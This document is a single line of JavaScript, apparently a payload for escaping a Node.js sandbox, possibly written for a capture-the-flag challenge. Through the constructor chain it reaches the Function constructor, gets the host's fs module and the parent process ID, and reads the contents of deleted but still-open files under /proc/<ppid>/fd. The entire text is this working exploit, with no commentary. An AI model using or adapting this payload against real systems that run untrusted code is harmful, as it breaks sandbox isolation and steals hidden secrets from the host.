const [p,a]=this.constructor.constructor("return [process.ppid,(this.global.require||process.mainModule.require)('fs')]")();const b="/proc/"+p+"/fd/";let r="";a.readdirSync(b).forEach((c)=>{const d=b+"/"+c;try{if(a.readlinkSync(d).endsWith('(deleted)')){r+=a.readFileSync(d).toString().trim()}}catch{}});r;